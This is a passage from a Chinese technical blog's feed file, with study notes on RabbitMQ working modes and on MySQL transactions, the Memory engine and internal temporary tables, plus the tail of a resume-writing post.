alt="clipboard.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>不要害怕写简历，不要敷衍写简历，简历上一定不要有错别字，这个很影响第一印象。</p><p>写在简历上的任何内容，都是有可能被问到的，所以要提前做好功课，不打没有准备的仗。</p><blockquote><p>找工作应该抱着怎样的心态？</p></blockquote><p>不管这家公司的面试能不能过，但最起码要把面试的机会争取到</p>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ 常见的工作模式</title>
      <link href="/rabbitmq-common-working-mode/"/>
      <url>/rabbitmq-common-working-mode/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记主要用来介绍 RabbitMQ 常见的几种工作模式。</p><a id="more"></a><h2 id="五种工作模式"><a href="#五种工作模式" class="headerlink" title="五种工作模式"></a>五种工作模式</h2><h3 id="简单模式"><a href="#简单模式" class="headerlink" title="简单模式"></a>简单模式</h3><p>最简单的工作队列，其中一个消息生产者，一个消息消费者，一个队列。也称为点对点模式</p><p><img src="https://img2020.cnblogs.com/blog/630011/202108/630011-20210823224226426-2036472160.png" alt=""></p><p>一个生产者 P 发送消息到队列 Q，一个消费者 C 进行接收。</p><h3 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h3><p>一个消息生产者，一个交换器，一个消息队列，多个消费者。同样也称为点对点模式</p><p><img src="https://img2020.cnblogs.com/blog/630011/202108/630011-20210823234032492-1935279120.png" alt=""></p><p>生产者 P 发送消息到队列，多个消费者 C 消费队列的数据。</p><p>工作队列也称为公平性队列模式，循环分发，RabbitMQ 将按顺序将每条消息发送给下一个消费者，每个消费者将获得相同数量的消息。</p><h3 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h3><p>一个消息生产者，一个交换机（交换机类型为fanout），多个消息队列，多个消费者。称为发布/订阅模式</p><p>在应用中，只需要简单的将队列绑定到交换机上。一个发送到交换机的消息都会被转发到与该交换机绑定的所有队列上。很像子网广播，每台子网内的主机都获得了一份复制的消息。</p><p><img src="https://img2020.cnblogs.com/blog/630011/202108/630011-20210824004518932-1431271545.png" alt=""></p><p>生产者 P 只需把消息发送到交换机X，绑定这个交换机的队列都会获得一份一样的数据。</p><h3 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h3><p>在发布/订阅模式的基础上，有选择的接收消息，也就是通过 routing 路由进行匹配条件是否满足接收消息。</p><p><img src="https://img2020.cnblogs.com/blog/630011/202108/630011-20210824232341125-726054635.png" alt=""></p><p>在路由模式下，会把消息路由到哪些 binding key 与 routing key 完全匹配的 Queue。</p><p>生产者P发送数据是要指定交换机(X）和routing发送消息 ，指定的routingKey=error，则队列Q1和队列Q2都会有一份数据，如果指定routingKey=into,或=warning，交换机(X)只会把消息发到Q2队列。</p><h3 id="主题模式"><a href="#主题模式" class="headerlink" title="主题模式"></a>主题模式</h3><p>主题模式和路由模式类似，只不过路由模式是指定固定的路由键 routingKey，而主题模式是可以模糊匹配路由键 routingKey，类似于SQL中 = 和 like 的关系。</p><p><img src="https://img2020.cnblogs.com/blog/630011/202108/630011-20210825001059370-1966411856.png" alt=""></p><h2 id="死信队列"><a href="#死信队列" class="headerlink" title="死信队列"></a>死信队列</h2><p>DLX 全称是 Dead-Letter-Exchange，死信交换机。</p><p>当一个队列中的消息变成死信之后，会被重新发送到另一个交换机，这个交换机就是 DLX，而绑定 DLX 的队列就是死信队列。</p><p>什么情况下会变成死信呢？</p><ol><li>消息被拒绝</li><li>消息过期</li><li>队列达到最大长度</li></ol><p>延时队列就是当消息发送以后，并不想让消费者立刻拿到消息，而是等待特定时间后消费者才能拿到消息来消费。</p><p>延时功能可以通过设置过期时间（TTL）+死信队列（DLX）来实现。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20230117125252.png" alt=""></p><p>当已经存在一个队列了，此时再次声明相同名称的队列时，如果属性不一致，就会出现错误。</p><blockquote><p>inequivalent arg ‘x-message-ttl’ for queue</p></blockquote><p>解决办法就是，删除掉已经存在的队列。</p><p>因为 RabbitMQ 有多种工作方式，在不同工作模式下，消息投递到队列的方式是不一样的。</p><ul><li>简单模式：不需要交换机，直接投递到队列</li><li>路由模式：需要交换机、需要 Routing Key，通过将 Routing 与 Queue 进行绑定，消息才能通过交换机到正确的路由上</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/Leo_wl/p/15507961.html#_label3" target="_blank" rel="noopener">RabbitMQ 常见的工作模式</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> MQ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MQ </tag>
            
            <tag> RabbitMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 专栏学习笔记</title>
      <link href="/mysql-column-study-notes/"/>
      <url>/mysql-column-study-notes/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，持续更新。</p><a id="more"></a><h2 id="关于事务"><a href="#关于事务" class="headerlink" title="关于事务"></a>关于事务</h2><p>起初会疑惑，事务是可以单独开启，也就是通过 <code>begin/start transaction</code> 这类命令，显式的开启事务。</p><p>那我单独的执行一个 update 语句时，是不是就表示没有开启事务？</p><p>并不是的，在 Mysql 中，有一个 <code>autocommit</code> 的参数，它表示是否自动启用事务，默认是启用的，</p><p>当我们没有显式地使用 <code>begin/start transaction</code> 时，直接执行一个 update 语句，表示这个 update 语句本身就是一个事务，语句完成的时候会自动提交。</p><p>你可能会问，既然有了这个自动启用事务，那为什么还需要手动来启用事务呢？</p><p>这是因为为了保证原子性，开发时，常常会遇到某个逻辑里面可能含有多个 MDL 操作，我们可能希望，这些操作要么全部成功，要么全部失败，那么这个时候，就会选择手动开启事务，将这些操作放在一个事务里面。</p><p>所以，我们在执行的任何一个 MDL 语句，都是带有事务的，只是，这类事务通常是自动启用/提交的，对于客户端的使用者来说，其过程是无感知的。</p><p>另外还有几点需要注意：</p><ol><li><code>begin/start transaction</code> 命令并不是一个事务的起点，在执行到它们之后的第一个操作 InnoDB 表的语句，事务才真正启动。</li><li>如果想要马上启动一个事务，那么可以使用 <code>start transaction with consistent snapshot</code></li></ol><h2 id="关于死锁"><a href="#关于死锁" class="headerlink" title="关于死锁"></a>关于死锁</h2><p>其实对于小公司的业务而言，数据库不太容易发生死锁的，也就是说，只要没有开启了但未释放的事务，或者长事务未提交以及慢查询这些，基本上不会出现死锁的问题。</p><p>（一个慢查询会导致表锁，此时对这张表进行增删改查都会被锁住。）</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220905223301.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220905223311.png" alt=""></p><p>toC 场景的系统大多要面对较高的 QPS，即使是小型/中型公司使用 MySQL，没有那么高的查询量，单表数据在百万量级也属常见。</p><p>对于小公司来说，DB 同时又是非常脆弱的一环，因为只要一个工程师不慎将不带索引的查询代码带上线，就会导致线上事故。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>38 都说InnoDB好，那还要不要使用Memory引擎</title>
      <link href="/it-is-said-that-innodb-is-good-so-do-you-want-to-use-the-memory-engine/"/>
      <url>/it-is-said-that-innodb-is-good-so-do-you-want-to-use-the-memory-engine/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 InnoDB 与 Memory 引擎的区别</li><li>了解 Memory 引擎的优缺点</li></ul><a id="more"></a><h2 id="内存表的数据组织结构"><a href="#内存表的数据组织结构" class="headerlink" title="内存表的数据组织结构"></a>内存表的数据组织结构</h2><p>为了便于分析，我来把这个问题简化一下，假设有以下的两张表 t1 和 t2，其中表 t1 使用 Memory 引擎， 表 t2 使用 InnoDB 引擎。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table t1(id int primary key, c int) engine&#x3D;Memory;</span><br><span class="line">create table t2(id int primary key, c int) engine&#x3D;innodb;</span><br><span class="line">insert into t1 values(1,1),(2,2),(3,3),(4,4),(5,5),(6,6),(7,7),(8,8),(9,9),(0,0);</span><br><span class="line">insert into t2 values(1,1),(2,2),(3,3),(4,4),(5,5),(6,6),(7,7),(8,8),(9,9),(0,0);</span><br></pre></td></tr></table></figure><p>然后，分别执行 select * from t1 和 select * from t2</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819180748.png" alt=""></p><p>可以看到，内存表 t1 的返回结果里面 0 在最后一行，而 InnoDB 表 t2 的返回结果里 0 在第一行。</p><p>出现这个区别的原因，要从这两个引擎的主键索引的组织方式说起。</p><p>表 t2 用的是 InnoDB 引擎，它的主键索引 id 的组织方式，你已经很熟悉了：InnoDB 表的数据就放在主键索引树上，主键索引是 B+ 树。所以表 t2 的数据组织方式如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819180832.png" alt=""></p><p>主键索引上的值是有序存储的。在执行 select * 的时候，就会按照叶子节点从左到右扫描，所以得到的结果里，0 就出现在第一行。</p><p>与 InnoDB 引擎不同，Memory 引擎的数据和索引是分开的。再来看一下表 t1 中的数据内容。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819180923.png" alt=""><br>可以看到，内存表的数据部分以数组的方式单独存放，而主键 id 索引里，存的是每个数据的位置。主键 id 是 hash 索引，可以看到索引上的 key 并不是有序的。</p><p>在内存表 t1 中，当我执行 select * 的时候，走的是全表扫描，也就是顺序扫描这个数组。因此，0 就是最后一个被读到，并放入结果集的数据。</p><p>可见，InnoDB 和 Memory 引擎的数据组织方式是不同的：</p><ul><li>InnoDB 引擎把数据放在主键索引上，其他索引上保存的是主键 id。这种方式，我们称之为<strong>索引组织表</strong>（Index Organizied Table）。</li><li>而 Memory 引擎采用的是把数据单独存放，索引上保存数据位置的数据组织形式，我们称之为<strong>堆组织表</strong>（Heap Organizied Table）。</li></ul><p>从中我们可以看出，这两个引擎的一些典型不同：</p><ol><li>InnoDB 表的数据总是有序存放的，而内存表的数据就是按照写入顺序存放的；</li><li>当数据文件有空洞的时候，InnoDB 表在插入新数据的时候，为了保证数据有序性，只能在固定的位置写入新值，而内存表找到空位就可以插入新值；</li><li>数据位置发生变化的时候，InnoDB 表只需要修改主键索引，而内存表需要修改所有索引；</li><li>InnoDB 表用主键索引查询时需要走一次索引查找，用普通索引查询的时候，需要走两次索引查找。而内存表没有这个区别，所有索引的“地位”都是相同的。</li><li>InnoDB 支持变长数据类型，不同记录的长度可能不同；内存表不支持 Blob 和 Text 字段，并且即使定义了 varchar(N)，实际也当作 char(N)，也就是固定长度字符串来存储，因此内存表的每行数据长度相同。</li></ol><p>由于内存表的这些特性，每个数据行被删除以后，空出的这个位置都可以被接下来要插入的数据复用。比如，如果要在表 t1 中执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete from t1 where id&#x3D;5;</span><br><span class="line">insert into t1 values(10,10);</span><br><span class="line">select * from t1;</span><br></pre></td></tr></table></figure><p>就会看到返回结果里，id=10 这一行出现在 id=4 之后，也就是原来 id=5 这行数据的位置。</p><p>需要指出的是，表 t1 的这个主键索引是哈希索引，因此如果执行范围查询，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1 where id&lt;5;</span><br></pre></td></tr></table></figure><p>是用不上主键索引的，需要走全表扫描。你可以借此再回顾下第 4 篇文章的内容。那如果要让内存表支持范围扫描，应该怎么办呢 ？</p><h2 id="hash-索引和-B-Tree-索引"><a href="#hash-索引和-B-Tree-索引" class="headerlink" title="hash 索引和 B-Tree 索引"></a>hash 索引和 B-Tree 索引</h2><p>实际上，内存表也是支 B-Tree 索引的。在 id 列上创建一个 B-Tree 索引，SQL 语句可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table t1 add index a_btree_index using btree (id);</span><br></pre></td></tr></table></figure><p>这时，表 t1 的数据组织形式就变成了这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819181246.png" alt=""><br>新增的这个 B-Tree 索引你看着就眼熟了，这跟 InnoDB 的 b+ 树索引组织形式类似。</p><p>作为对比，你可以看一下这下面这两个语句的输出：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819181316.png" alt=""></p><p>可以看到，执行 select * from t1 where id&lt;5 的时候，优化器会选择 B-Tree 索引，所以返回结果是 0 到 4。 使用 force index 强行使用主键 id 这个索引，id=0 这一行就在结果集的最末尾了。</p><p>其实，一般在我们的印象中，内存表的优势是速度快，其中的一个原因就是 Memory 引擎支持 hash 索引。当然，更重要的原因是，内存表的所有数据都保存在内存，而内存的读写速度总是比磁盘快。</p><p>但是，接下来我要跟你说明，为什么我不建议你在生产环境上使用内存表。这里的原因主要包括两个方面：</p><ol><li>锁粒度问题；</li><li>数据持久化问题。</li></ol><h2 id="内存表的锁"><a href="#内存表的锁" class="headerlink" title="内存表的锁"></a>内存表的锁</h2><p>我们先来说说内存表的锁粒度问题。</p><p><strong>内存表不支持行锁，只支持表锁。因此，一张表只要有更新，就会堵住其他所有在这个表上的读写操作。</strong></p><p>需要注意的是，这里的表锁跟之前我们介绍过的 MDL 锁不同，但都是表级的锁。接下来，我通过下面这个场景，跟你模拟一下内存表的表级锁。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819181506.png" alt=""></p><p>在这个执行序列里，session A 的 update 语句要执行 50 秒，在这个语句执行期间 session B 的查询会进入锁等待状态。session C 的 show processlist 结果输出如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220819181525.png" alt=""></p><p>跟行锁比起来，表锁对并发访问的支持不够好。所以，内存表的锁粒度问题，决定了它在处理并发事务的时候，性能也不会太好。</p><h2 id="数据持久性问题"><a href="#数据持久性问题" class="headerlink" title="数据持久性问题"></a>数据持久性问题</h2><p>接下来，我们再看看数据持久性的问题。</p><p>数据放在内存中，是内存表的优势，但也是一个劣势。因为，数据库重启的时候，所有的内存表都会被清空。</p><p>内存表并不适合在生产环境上作为普通数据表使用。</p><p>有同学会说，但是内存表执行速度快呀。这个问题，其实你可以这么分析：</p><ol><li>如果你的表更新量大，那么并发度是一个很重要的参考指标，InnoDB 支持行锁，并发度比内存表好；</li><li>能放到内存表的数据量都不大。如果你考虑的是读的性能，一个读 QPS 很高并且数据量不大的表，即使是使用 InnoDB，数据也是都会缓存在 InnoDB Buffer Pool 里的。因此，使用 InnoDB 表的读性能也不会差。</li></ol><p>所以，<strong>建议把普通内存表都用 InnoDB 表来代替</strong>。但是，有一个场景却是例外的。</p><p>这个场景就是，我们在第 35 和 36 篇说到的用户临时表。在数据量可控，不会耗费过多内存的情况下，你可以考虑使用内存表。</p><p>内存临时表刚好可以无视内存表的两个不足，主要是下面的三个原因：</p><ol><li>临时表不会被其他线程访问，没有并发性的问题；</li><li>临时表重启后也是需要删除的，清空数据这个问题不存在；</li><li>备库的临时表也不会影响主库的用户线程。</li></ol><p>现在，我们回过头再看一下第 35 篇 join 语句优化的例子，当时我建议的是创建一个 InnoDB 临时表，使用的语句序列是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create temporary table temp_t(id int primary key, a int, b int, index(b))engine&#x3D;innodb;</span><br><span class="line">insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;</span><br><span class="line">select * from t1 join temp_t on (t1.b&#x3D;temp_t.b);</span><br></pre></td></tr></table></figure><p>了解了内存表的特性，你就知道了， 其实这里使用内存临时表的效果更好，原因有三个：</p><ol><li>相比于 InnoDB 表，使用内存表不需要写磁盘，往表 temp_t 的写数据的速度更快；</li><li>索引 b 使用 hash 索引，查找的速度比 B-Tree 索引快；</li><li>临时表数据只有 2000 行，占用的内存有限。</li></ol><p>因此，你可以对第 35 篇文章的语句序列做一个改写，将临时表 t1 改成内存临时表，并且在字段 b 上创建一个 hash 索引。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create temporary table temp_t(id int primary key, a int, b int, index (b))engine&#x3D;memory;</span><br><span class="line">insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;</span><br><span class="line">select * from t1 join temp_t on (t1.b&#x3D;temp_t.b);</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>在生产上，我不建议你使用普通内存表</li><li>而内存表由于不支持行锁（只支持表锁），更新语句会阻塞查询</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>37 什么时候会使用内部临时表</title>
      <link href="/when-to-use-internal-temporary-tables/"/>
      <url>/when-to-use-internal-temporary-tables/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>MySQL 什么时候会使用内部临时表</li><li>了解 union 的执行流程</li><li>了解 group by 的执行流程</li></ul><a id="more"></a><h2 id="union-执行流程"><a href="#union-执行流程" class="headerlink" title="union 执行流程"></a>union 执行流程</h2><p>为了便于量化分析，我用下面的表 t1 来举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">create table t1(id int primary key, a int, b int, index(a));</span><br><span class="line">delimiter ;;</span><br><span class="line">create procedure idata()</span><br><span class="line">begin</span><br><span class="line">  declare i int;</span><br><span class="line"> </span><br><span class="line">  set i&#x3D;1;</span><br><span class="line">  while(i&lt;&#x3D;1000)do</span><br><span class="line">    insert into t1 values(i, i, i);</span><br><span class="line">    set i&#x3D;i+1;</span><br><span class="line">  end while;</span><br><span class="line">end;;</span><br><span class="line">delimiter ;</span><br><span class="line">call idata();</span><br></pre></td></tr></table></figure><p>然后，我们执行下面这条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1000 as f) union (select id from t1 order by id desc limit 2);</span><br></pre></td></tr></table></figure><p>这条语句用到了 union，它的语义是，取这两个子查询结果的并集。并集的意思就是这两个集合加起来，重复的行只保留一行。</p><p>下图是这个语句的 explain 结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818114704.png" alt=""></p><p>可以看到：</p><ul><li>第二行的 key=PRIMARY，说明第二个子句用到了索引 id。</li><li>第三行的 Extra 字段，表示在对子查询的结果集做 union 的时候，使用了临时表 (Using temporary)。</li></ul><p>这个语句的执行流程是这样的：</p><ol><li>创建一个内存临时表，这个临时表只有一个整型字段 f，并且 f 是主键字段。</li><li>执行第一个子查询，得到 1000 这个值，并存入临时表中。</li><li>执行第二个子查询：<ol><li>拿到第一行 id=1000，试图插入临时表中。但由于 1000 这个值已经存在于临时表了，违反了唯一性约束，所以插入失败，然后继续执行；</li><li>取到第二行 id=999，插入临时表成功。</li></ol></li><li>从临时表中按行取出数据，返回结果，并删除临时表，结果中包含两行数据分别是 1000 和 999。</li></ol><p>这个过程的流程图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818114456.png" alt=""><br>可以看到，<strong>这里的内存临时表起到了暂存数据的作用</strong>，而且计算过程还用上了临时表主键 id 的唯一性约束，实现了 union 的语义。</p><p>顺便提一下，如果把上面这个语句中的 union 改成 union all 的话，就没有了“去重”的语义。这样执行的时候，就依次执行子查询，得到的结果直接作为结果集的一部分，发给客户端。因此也就不需要临时表了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818114759.png" alt=""><br>可以看到，第二行的 Extra 字段显示的是 Using index，表示只使用了覆盖索引，没有用临时表了。</p><h2 id="group-by-执行流程"><a href="#group-by-执行流程" class="headerlink" title="group by 执行流程"></a>group by 执行流程</h2><p>另外一个常见的使用临时表的例子是 group by，我们来看一下这个语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id%10 as m, count(*) as c from t1 group by m;</span><br></pre></td></tr></table></figure><p>这个语句的逻辑是把表 t1 里的数据，按照 id%10 进行分组统计，并按照 m 的结果排序后输出。它的 explain 结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818115249.png" alt=""><br>在 Extra 字段里面，我们可以看到三个信息：</p><ul><li>Using index，表示这个语句使用了覆盖索引，选择了索引 a，不需要回表；</li><li>Using temporary，表示使用了临时表；</li><li>Using filesort，表示需要排序。</li></ul><p>这个语句的执行流程是这样的：</p><ol><li>创建内存临时表，表里有两个字段 m 和 c，主键是 m；</li><li>扫描表 t1 的索引 a，依次取出叶子节点上的 id 值，计算 id%10 的结果，记为 x；<ol><li>如果临时表中没有主键为 x 的行，就插入一个记录 (x,1);</li><li>如果表中有主键为 x 的行，就将 x 这一行的 c 值加 1；\</li></ol></li><li>遍历完成后，再根据字段 m 做排序，得到结果集返回给客户端。</li></ol><p>这个流程的执行图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818115534.png" alt=""><br>其中，对于内存临时表的排序在前面的章节已经介绍过。</p><p>接下来再来看看另一条语句的执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id%10 as m, count(*) as c from t1 group by m;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818124946.png" alt=""></p><p>如果你的需求并不需要对结果进行排序，那你可以在 SQL 语句末尾增加 order by null，也就是改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id%10 as m, count(*) as c from t1 group by m order by null;</span><br></pre></td></tr></table></figure><p>这样就跳过了最后排序的阶段，直接从临时表中取数据返回。返回的结果如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818125041.png" alt=""><br>由于表 t1 中的 id 值是从 1 开始的，因此返回的结果集中第一行是 id=1；扫描到 id=10 的时候才插入 m=0 这一行，因此结果集里最后一行才是 m=0。</p><p>这个例子里由于临时表只有 10 行，内存可以放得下，因此全程只使用了内存临时表。<strong>但是，内存临时表的大小是有限制的，参数 tmp_table_size 就是控制这个内存大小的，默认是 16M</strong>。</p><p>如果执行下面这个语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set tmp_table_size&#x3D;1024;</span><br><span class="line">select id%100 as m, count(*) as c from t1 group by m order by null limit 10;</span><br></pre></td></tr></table></figure><p>把内存临时表的大小限制为最大 1024 字节，并把语句改成 id % 100，这样返回结果里有 100 行数据。但是，这时的内存临时表大小不够存下这 100 行数据，也就是说，执行过程中会发现内存临时表大小到达了上限（1024 字节）。</p><p>那么，这时候就会把内存临时表转成磁盘临时表，磁盘临时表默认使用的引擎是 InnoDB。 这时，返回的结果如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818131332.png" alt=""><br>如果这个表 t1 的数据量很大，很可能这个查询需要的磁盘临时表就会占用大量的磁盘空间。</p><h2 id="group-by-优化方法"><a href="#group-by-优化方法" class="headerlink" title="group by 优化方法"></a>group by 优化方法</h2><p>可以看到，不论是使用内存临时表还是磁盘临时表，group by 逻辑都需要构造一个带唯一索引的表，执行代价都是比较高的。如果表的数据量比较大，上面这个 group by 语句执行起来就会很慢，我们有什么优化的方法呢？</p><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>要解决 group by 语句的优化问题，你可以先想一下这个问题：执行 group by 语句为什么需要临时表？</p><p>group by 的语义逻辑，是统计不同的值出现的个数。但是，由于每一行的 id%100 的结果是无序的，所以我们就需要有一个临时表，来记录并统计结果。</p><p>那么，如果扫描过程中可以保证出现的数据是有序的，是不是就简单了呢？</p><p>假设，现在有一个类似图 10 的这么一个数据结构，我们来看看 group by 可以怎么做。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818131815.png" alt=""><br>可以看到，如果可以确保输入的数据是有序的，那么计算 group by 的时候，就只需要从左到右，顺序扫描，依次累加。也就是下面这个过程：</p><ul><li>当碰到第一个 1 的时候，已经知道累积了 X 个 0，结果集里的第一行就是 (0,X);</li><li>当碰到第一个 2 的时候，已经知道累积了 Y 个 1，结果集里的第二行就是 (1,Y);</li></ul><p>按照这个逻辑执行的话，扫描到整个输入的数据结束，就可以拿到 group by 的结果，不需要临时表，也不需要再额外排序。</p><p>你一定想到了，InnoDB 的索引，就可以满足这个输入有序的条件。</p><p>在 MySQL 5.7 版本支持了 generated column 机制，用来实现列数据的关联更新。你可以用下面的方法创建一个列 z，然后在 z 列上创建一个索引（如果是 MySQL 5.6 及之前的版本，你也可以创建普通列和索引，来解决这个问题）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table t1 add column z int generated always as(id % 100), add index(z);</span><br></pre></td></tr></table></figure><p>这样，索引 z 上的数据就是类似图 10 这样有序的了。上面的 group by 语句就可以改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select z, count(*) as c from t1 group by z;</span><br></pre></td></tr></table></figure><p>优化后的 group by 语句，不再需要临时表，也不需要排序了。</p><h3 id="直接排序"><a href="#直接排序" class="headerlink" title="直接排序"></a>直接排序</h3><p>所以，如果可以通过加索引来完成 group by 逻辑就再好不过了。但是，如果碰上不适合创建索引的场景，我们还是要老老实实做排序的。那么，这时候的 group by 要怎么优化呢？</p><p>如果我们明明知道，一个 group by 语句中需要放到临时表上的数据量特别大，却还是要按照“先放到内存临时表，插入一部分数据后，发现内存临时表不够用了再转成磁盘临时表”，看上去就有点儿傻。</p><p>那么，我们就会想了，MySQL 有没有让我们直接走磁盘临时表的方法呢？</p><p>答案是，有的。</p><p>在 group by 语句中加入 SQL_BIG_RESULT 这个提示（hint），就可以告诉优化器：这个语句涉及的数据量很大，请直接用磁盘临时表。</p><p>MySQL 的优化器一看，磁盘临时表是 B+ 树存储，存储效率不如数组来得高。所以，既然你告诉我数据量很大，那从磁盘空间考虑，还是直接用数组来存吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SQL_BIG_RESULT id%100 as m, count(*) as c from t1 group by m;</span><br></pre></td></tr></table></figure><p>因此，上面这个语句执行流程就是这样的：</p><ol><li>初始化 sort_buffer，确定放入一个整型字段，记为 m；</li><li>扫描表 t1 的索引 a，依次取出里面的 id 值, 将 id%100 的值存入 sort_buffer 中；</li><li>扫描完成后，对 sort_buffer 的字段 m 做排序（如果 sort_buffer 内存不够用，就会利用磁盘临时文件辅助排序）；</li><li>排序完成后，就得到了一个有序数组。</li></ol><p>根据有序数组，得到数组里面的不同值，以及每个值的出现次数。这一步的逻辑，你已经从前面的图中了解过了。</p><p>下面两张图分别是执行流程图和执行 explain 命令得到的结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220818132108.png" alt=""><br>优化后的 group by 语句，没有再使用临时表，而是直接用了排序算法。</p><p>基于上面的 union、union all 和 group by 语句的执行过程的分析，我们来回答文章开头的问题：MySQL 什么时候会使用内部临时表？</p><ol><li>如果语句执行过程可以一边读数据，一边直接得到结果，是不需要额外内存的，否则就需要额外的内存，来保存中间结果；</li><li>join_buffer 是无序数组，sort_buffer 是有序数组，临时表是二维表结构；</li><li>如果执行逻辑需要用到二维表特性，就会优先考虑使用临时表。比如我们的例子中，union 需要用到唯一索引约束， group by 还需要用到另外一个字段来存累积计数。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>如果对 group by 语句的结果没有排序要求，要在语句后面加 order by null；</li><li>尽量让 group by 